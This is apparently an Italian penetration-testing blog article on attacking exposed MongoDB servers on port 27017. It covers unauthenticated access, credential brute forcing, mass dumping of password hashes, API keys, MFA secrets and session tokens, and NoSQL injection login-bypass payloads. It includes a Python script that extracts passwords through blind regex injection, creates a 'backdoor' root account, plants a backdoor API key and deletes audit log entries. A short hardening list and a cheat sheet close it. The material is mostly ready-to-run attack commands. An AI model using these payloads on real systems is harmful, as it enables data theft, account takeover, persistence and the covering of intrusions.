---
title: 'Porta 27017 MongoDB: Accesso Senza Password, NoSQL Injection e Dump Dati'
slug: porta-27017-mongodb
description: >-
  MongoDB esposto sulla 27017? Accedi senza auth, bypassa il login con $ne,
  dumpa credenziali e MFA secret, esegui privilege escalation. Pentest completo
  con payload operativi.
image: /porta-27017-mongodb.webp
draft: false
date: 2026-04-20T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - nosql-injection
  - mongodb
  - sql-injection
---

MongoDB è il database NoSQL document-oriented più popolare al mondo: memorizza dati in documenti JSON (BSON internamente), senza schema fisso, con query potenti e scalabilità orizzontale. Lo usano startup, enterprise, piattaforme SaaS, e-commerce — qualsiasi applicazione moderna che preferisce JSON alle tabelle relazionali. Ascolta sulla porta 27017 TCP e, storicamente, è stato il **database più esposto su Internet**: per anni, la configurazione di default ha fatto bind su `0.0.0.0` senza autenticazione. MongoDB senza password, accessibile da chiunque, con tutti i dati dell'applicazione visibili. Questo ha portato a decine di migliaia di istanze compromesse, ransomware che cancellava i dati e li "vendeva indietro", e data breach massivi.

Nel 2026, MongoDB ha migliorato i default (bind su `localhost` dalla versione 3.6, auth suggerita nel setup), ma il problema è tutt'altro che risolto. Trovo ancora regolarmente istanze senza auth durante i penetration test — soprattutto in ambienti Docker dove il container fa port mapping su `0.0.0.0:27017`, in ambienti di staging promossi in produzione, e in aziende che "non hanno ancora avuto tempo di configurare la sicurezza". E anche quando l'auth c'è, la NoSQL injection è un vettore potente e meno conosciuto rispetto alla [SQL injection](https://hackita.it/articoli/porta-8080-tomcat) classica.

Un episodio che racconto spesso nei corsi: durante un pentest esterno per una fintech, ho trovato la 27017 esposta su Internet senza autenticazione. Il database conteneva una collection `users` con 45.000 record — email, password in bcrypt, e una collection `kyc_documents` con scan di passaporti e carte d'identità in base64. Nessun firewall, nessuna password. L'azienda gestiva i risparmi dei clienti. Ho scritto il finding con priorità P0 e ho avuto la conferma che è stata la singola vulnerabilità più costosa in termini di remediation che l'azienda abbia mai affrontato.

## Cos'è MongoDB — Per Chi Viene dal Mondo SQL

In MongoDB non ci sono tabelle ma **collection** (insiemi di documenti). Non ci sono righe ma **documenti** (oggetti JSON). Non c'è schema fisso — ogni documento nella stessa collection può avere campi diversi. Le query non sono SQL ma **MQL** (MongoDB Query Language), basato su JSON.

```
SQL                          MongoDB
─────────────────────────────────────────
Database                 →   Database
Tabella                  →   Collection
Riga                     →   Documento (JSON)
Colonna                  →   Campo
SELECT * FROM users      →   db.users.find()
WHERE email = 'x'        →   db.users.find({email: 'x'})
INSERT INTO users...     →   db.users.insertOne({...})
```

```
Applicazione                   MongoDB (:27017)
┌──────────────┐              ┌────────────────────────┐
│ Node.js      │── driver ───►│ Database: "production" │
│ Python       │              │   ├── users (45K docs)  │
│ Java         │              │   ├── orders (2M docs)  │
│              │              │   ├── products (5K docs) │
│ mongosh      │── shell ───►│   ├── sessions (12K)    │
│              │              │   └── kyc_docs (45K)    │
└──────────────┘              └────────────────────────┘
```

## 1. Enumerazione

### Nmap

```bash
nmap -sV -p 27017,27018,27019 10.10.10.40
```

```
PORT      STATE SERVICE VERSION
27017/tcp open  mongodb MongoDB 7.0.12
```

```bash
# Script Nmap per info dettagliate
nmap -p 27017 --script mongodb-info,mongodb-databases 10.10.10.40
```

### Connessione diretta

```bash
# mongosh (il client moderno)
mongosh mongodb://10.10.10.40:27017

# mongo (il client legacy)
mongo 10.10.10.40:27017
```

Se si connette senza chiedere credenziali → **accesso senza autenticazione**.

```bash
# Test rapido da command line
mongosh --host 10.10.10.40 --eval "db.adminCommand('listDatabases')" --quiet
```

```json
{
  "databases": [
    {"name": "admin", "sizeOnDisk": 40960},
    {"name": "config", "sizeOnDisk": 73728},
    {"name": "production", "sizeOnDisk": 2147483648},
    {"name": "staging", "sizeOnDisk": 1073741824},
    {"name": "local", "sizeOnDisk": 40960}
  ],
  "totalSize": 3221340160
}
```

Due database applicativi: `production` (2GB) e `staging` (1GB).

## 2. Autenticazione

### Senza autenticazione (il caso più comune nei pentest)

Verifica:

```bash
mongosh --host 10.10.10.40 --eval "db.runCommand({connectionStatus:1})" --quiet
```

```json
{
  "authInfo": {
    "authenticatedUsers": [],
    "authenticatedUserRoles": []
  },
  "ok": 1
}
```

`authenticatedUsers: []` → nessuna autenticazione richiesta. Accesso completo.

### Default credentials (quando l'auth è abilitata)

MongoDB non ha credenziali di default — l'utente admin viene creato durante il setup. Ma le password deboli sono ovunque:

| Username | Password   | Contesto          |
| -------- | ---------- | ----------------- |
| `admin`  | `admin`    | Il classico       |
| `root`   | `root`     | Setup pigro       |
| `mongo`  | `mongo`    | Nome del servizio |
| `admin`  | `password` | Default mentale   |
| `admin`  | `changeme` | "Lo cambio dopo"  |

```bash
# Test con credenziali
mongosh "mongodb://admin:admin@10.10.10.40:27017/admin"

# Brute force con Hydra (auth SCRAM-SHA-256)
nmap -p 27017 --script mongodb-brute 10.10.10.40
```

## 3. Enumerazione Database e Collection

```javascript
// Lista database
show dbs

// Seleziona database
use production

// Lista collection
show collections
```

```
users
orders
products
sessions
payments
audit_log
kyc_documents
api_keys
```

```javascript
// Conta documenti per collection
db.users.countDocuments()        // 45000
db.orders.countDocuments()       // 2100000
db.payments.countDocuments()     // 890000
db.kyc_documents.countDocuments() // 45000

// Schema di un documento (campione)
db.users.findOne()
```

```json
{
    "_id": ObjectId("65a1b2c3d4e5f6789012"),
    "email": "admin@corp.com",
    "password": "$2b$12$abc123...",
    "role": "administrator",
    "name": "Admin User",
    "phone": "+393331234567",
    "api_key": "ak_live_abc123def456",
    "mfa_secret": "JBSWY3DPEHPK3PXP",
    "created_at": ISODate("2025-01-15T10:00:00Z"),
    "last_login": ISODate("2026-02-14T08:30:00Z")
}
```

Password hash bcrypt, API key, **MFA secret** (con quello puoi generare i codici TOTP e bypassare il 2FA), email e telefono.

## 4. Dump Dati Sensibili

### Utenti e credenziali

```javascript
// Dump tutti gli utenti con hash e api_key
db.users.find({}, {email:1, password:1, role:1, api_key:1, mfa_secret:1}).limit(100).pretty()

// Solo gli admin
db.users.find({role: "administrator"}, {email:1, password:1, api_key:1}).pretty()

// Utenti con MFA secret (bypass 2FA)
db.users.find({mfa_secret: {$exists: true}}, {email:1, mfa_secret:1}).pretty()
```

Hash bcrypt → [Hashcat](https://hackita.it/articoli/hashcat) mode 3200. API key → accesso diretto. MFA secret → genera TOTP con `oathtool --totp -b "JBSWY3DPEHPK3PXP"`.

### Session token

```javascript
// Session attive
db.sessions.find({}, {user_id:1, token:1, expires:1}).sort({expires: -1}).limit(50)
```

Token di sessione → [session hijacking](https://hackita.it/articoli/porta-11211-memcached) immediato.

### Dati finanziari

```javascript
// Pagamenti recenti con importi alti
db.payments.find({amount: {$gt: 10000}}, {user_id:1, amount:1, iban:1, recipient:1}).sort({amount: -1}).limit(20)
```

### Dump massivo con mongodump

```bash
# Dump completo del database (tutti i dati)
mongodump --host 10.10.10.40 --port 27017 --db production --out /tmp/mongo_dump/

# Dump di una singola collection
mongodump --host 10.10.10.40 --port 27017 --db production --collection users --out /tmp/dump/

# Con auth
mongodump --host 10.10.10.40 --port 27017 -u admin -p password --authenticationDatabase admin --db production --out /tmp/dump/
```

### Export in JSON leggibile

```bash
mongoexport --host 10.10.10.40 --port 27017 --db production --collection users --out users.json
```

## 5. NoSQL Injection

La NoSQL injection è l'equivalente della [SQL injection](https://hackita.it/articoli/porta-8080-tomcat) per MongoDB. Sfrutta il fatto che le query MongoDB sono oggetti JSON — e se l'applicazione inserisce input utente direttamente nella query, puoi manipolare la logica.

### Authentication bypass

Se l'applicazione fa:

```javascript
// Codice vulnerabile (Node.js/Express)
db.users.findOne({username: req.body.username, password: req.body.password})
```

```bash
# Login bypass con operatore $ne (not equal)
curl -s -X POST http://10.10.10.40:8080/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":""}}'
```

La query diventa: `findOne({username: "admin", password: {$ne: ""}})` → trova l'utente admin con qualsiasi password non vuota → **authentication bypass**.

```bash
# Variante con $gt (greater than)
curl -s -X POST http://10.10.10.40:8080/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$gt":""}}'

# Variante con $regex
curl -s -X POST http://10.10.10.40:8080/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$regex":".*"},"password":{"$regex":".*"}}'
```

L'ultima variante fa login come il **primo utente nel database** (tipicamente l'admin).

### NoSQL injection via parametri URL

```bash
# Se l'app usa query string
curl -s "http://10.10.10.40:8080/api/users?username[$ne]=&password[$gt]="
```

### Estrazione dati con $regex (blind NoSQL injection)

Se l'unico feedback è login success/fail:

```bash
# Estrai la password carattere per carattere
# Testa se la password dell'admin inizia con "a"
curl -s -X POST http://10.10.10.40:8080/login \
  -d '{"username":"admin","password":{"$regex":"^a"}}'
# Se login success → la password inizia con "a"

# Continua: inizia con "ab"?
curl -s -X POST http://10.10.10.40:8080/login \
  -d '{"username":"admin","password":{"$regex":"^ab"}}'
```

Automatizza con uno script:

```python
import requests, string

url = "http://10.10.10.40:8080/login"
password = ""
chars = string.ascii_letters + string.digits + "!@#$%"

while True:
    found = False
    for c in chars:
        payload = {"username": "admin", "password": {"$regex": f"^{password}{c}"}}
        r = requests.post(url, json=payload)
        if "Welcome" in r.text:  # Indicatore di successo
            password += c
            print(f"[+] Password: {password}")
            found = True
            break
    if not found:
        break

print(f"[*] Final: {password}")
```

### $where injection (JavaScript injection)

Se l'app usa `$where` con input utente:

```bash
# Sleep-based detection (time-based)
curl -s -X POST http://10.10.10.40:8080/api/search \
  -d '{"$where": "sleep(5000) || true"}'
# Se la risposta ritarda di 5 secondi → $where injection confermata

# Data extraction
curl -s -X POST http://10.10.10.40:8080/api/search \
  -d '{"$where": "this.role == '\''admin'\'' && this.password.match(/^a/)"}'
```

### Tool per NoSQL injection

```bash
# NoSQLMap
python3 nosqlmap.py -u http://10.10.10.40:8080/login -p username,password

# Nuclei
nuclei -u http://10.10.10.40:8080 -tags nosqli
```

## 6. Privilege Escalation in MongoDB

### Da utente read-only a admin

Se hai credenziali con ruolo limitato:

```javascript
// Verifica i tuoi ruoli
db.runCommand({connectionStatus: 1})

// Se sei nel database admin e hai il ruolo userAdminAnyDatabase:
db.grantRolesToUser("tuoutente", [{role: "root", db: "admin"}])
```

### Creare un utente admin (se hai userAdmin)

```javascript
use admin
db.createUser({
    user: "backdoor",
    pwd: "B4ckd00r_2026!",
    roles: [{role: "root", db: "admin"}]
})
```

### Leggere le credenziali degli utenti MongoDB

```javascript
use admin
db.system.users.find().pretty()
```

```json
{
    "_id": "admin.admin",
    "user": "admin",
    "db": "admin",
    "credentials": {
        "SCRAM-SHA-256": {
            "iterationCount": 15000,
            "salt": "abc123...",
            "storedKey": "def456...",
            "serverKey": "ghi789..."
        }
    },
    "roles": [{"role": "root", "db": "admin"}]
}
```

Gli hash SCRAM-SHA-256 non sono craccabili facilmente come bcrypt, ma le credenziali degli utenti applicativi (nella collection `users` del database applicativo) tipicamente sì.

## 7. Manipolazione Dati

### Elevare i propri privilegi nell'applicazione

```javascript
// Se conosci il tuo user ID nell'applicazione
db.users.updateOne(
    {email: "tuo.account@email.com"},
    {$set: {role: "administrator", is_admin: true}}
)
```

### Inserire dati (backdoor)

```javascript
db.api_keys.insertOne({
    user: "backdoor",
    key: "ak_live_attacker123",
    permissions: ["admin", "read", "write"],
    created_at: new Date()
})
```

### Cancellare tracce

```javascript
// Rimuovi i tuoi accessi dai log
db.audit_log.deleteMany({ip: "10.10.10.200"})
```

## 8. Post-Exploitation e Lateral Movement

```javascript
// Cerca connection string ad altri database
db.getCollectionNames().forEach(function(c) {
    db[c].find({$or: [
        {$text: {$search: "jdbc"}},
        {$text: {$search: "redis"}},
        {$text: {$search: "amqp"}}
    ]}).limit(5).forEach(printjson)
})
```

Le credenziali trovate in MongoDB → test su [PostgreSQL](https://hackita.it/articoli/porta-5432-postgresql), [MySQL](https://hackita.it/articoli/porta-3306-mysql), [Redis](https://hackita.it/articoli/porta-6379-redis), [SSH](https://hackita.it/articoli/ssh), [RabbitMQ](https://hackita.it/articoli/porta-15672-rabbitmq-web), [Elasticsearch](https://hackita.it/articoli/porta-9200-elasticsearch).

```bash
# Config file MongoDB (credenziali replica set, keyfile)
cat /etc/mongod.conf | grep -iE "password|key|auth|bind"
```

## 9. Detection & Hardening

* **Abilita autenticazione** — `security.authorization: enabled` in `mongod.conf`
* **Bind su 127.0.0.1** o IP specifici — mai `0.0.0.0`
* **Password forte** per l'admin — non `admin:admin`
* **RBAC** — utenti con ruoli minimi (`readWrite` su un singolo database, non `root`)
* **TLS** — `net.tls.mode: requireTLS`
* **Firewall** — porta 27017 accessibile solo dall'applicazione
* **Non esporre su Internet** — mai
* **Aggiorna** — MongoDB 7.x ha security-by-default migliore
* **Audit log** — abilita per tracciare query e modifiche

## 10. Mini FAQ

**MongoDB ha ancora il problema dell'accesso senza password?**
Sì, nel 2026 è ancora un problema reale. Le versioni recenti (3.6+) fanno bind su `localhost` di default, ma i container Docker, le configurazioni cloud custom e gli ambienti migrati da versioni vecchie spesso espongono la 27017 su `0.0.0.0` senza auth. Shodan mostra ancora decine di migliaia di istanze accessibili.

**La NoSQL injection è pericolosa come la SQL injection?**
Diversamente pericolosa: non puoi fare `UNION SELECT` per leggere tabelle arbitrarie, ma puoi bypassare l'autenticazione, estrarre dati con regex blind injection e, con `$where`, eseguire JavaScript lato server. In certi scenari è più facile della SQLi perché molti sviluppatori non sanno che esiste.

**Come trovo MongoDB se non è sulla porta 27017?**
`nmap -sV --allports target` oppure cerca nei file di configurazione dell'applicazione: `MONGODB_URI`, `MONGO_URL`, `mongoose.connect()` nel codice sorgente (se hai accesso via [Git](https://hackita.it/articoli/porta-9418-git) o [SonarQube](https://hackita.it/articoli/porta-9000-php-fpm-sonarqube)).

## 11. Cheat Sheet Finale

| Azione           | Comando                                                              |
| ---------------- | -------------------------------------------------------------------- |
| Nmap             | `nmap -sV -p 27017 --script mongodb-info,mongodb-databases target`   |
| Connetti         | `mongosh mongodb://target:27017`                                     |
| Test no-auth     | `mongosh --host target --eval "db.adminCommand('listDatabases')"`    |
| Lista DB         | `show dbs`                                                           |
| Lista collection | `show collections`                                                   |
| Conta docs       | `db.COLLECTION.countDocuments()`                                     |
| Dump utenti      | `db.users.find({},{email:1,password:1,role:1,api_key:1})`            |
| Admin users      | `db.users.find({role:"administrator"})`                              |
| mongodump        | `mongodump --host target --db DBNAME --out /tmp/dump/`               |
| mongoexport      | `mongoexport --host target --db DB --collection COL --out out.json`  |
| System users     | `use admin; db.system.users.find()`                                  |
| Crea admin       | `db.createUser({user:"x",pwd:"y",roles:[{role:"root",db:"admin"}]})` |
| NoSQLi bypass    | `{"username":"admin","password":{"$ne":""}}`                         |
| NoSQLi regex     | `{"username":"admin","password":{"$regex":"^a"}}`                    |
| NoSQLi URL       | `?username[$ne]=&password[$gt]=`                                     |
| $where           | `{"$where":"sleep(5000)"}`                                           |
| Brute (Nmap)     | `nmap -p 27017 --script mongodb-brute target`                        |

***

Riferimento: MongoDB Security Checklist, OWASP NoSQL injection, HackTricks MongoDB. Uso esclusivo in ambienti autorizzati. [https://hacktricks.wiki/en/network-services-pentesting/27017-27018-mongodb.html](https://hacktricks.wiki/en/network-services-pentesting/27017-27018-mongodb.html)

> MongoDB senza password è come una cassaforte aperta in piazza. [Penetration test HackIta](https://hackita.it/servizi) per verificare la tua configurazione. Per diventare un esperto di exploitation NoSQL: [formazione 1:1 con lab dedicati](https://hackita.it/formazione).
